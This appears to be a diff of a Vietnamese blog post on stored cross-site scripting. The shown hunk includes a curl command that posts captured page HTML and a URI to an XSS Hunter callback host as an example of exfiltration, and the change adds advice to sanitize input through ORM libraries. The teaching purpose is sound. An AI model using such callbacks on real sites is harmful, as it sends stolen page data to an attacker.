@@ -73,7 +73,8 @@ gửi về cho attacker trong hàm bên dưới</p>
 }</code></pre>
 <p>Hoặc callback luôn bằng curl</p>
 <pre><code>&gt; curl -v -XPOST 'https://d0x5.xss.ht/page_callback' -d'{&quot;page_html&quot;:&quot;fuckyou&quot;, &quot;uri&quot;:&quot;fuck you again&quot;}'</code></pre>
-<p><strong>Hãy luôn sanitize input data có kiểu string ;) và kỹ hơn nữa thì nên sanitize data load từ database khi render html page.</strong></p>
+<p><strong>Hãy luôn sanitize input data có kiểu string ;) và kỹ hơn nữa thì nên sanitize data load từ database khi render html page.</strong>
+Hoặc nên dùng các thư viện ORM có hỗ trợ việc sanitize/ cast các malicious input data này.</p>
 <p>Nếu bạn còn tò mò, hãy vọc vạch thêm từ đây https://xsshunter.com/</p>
 
 							
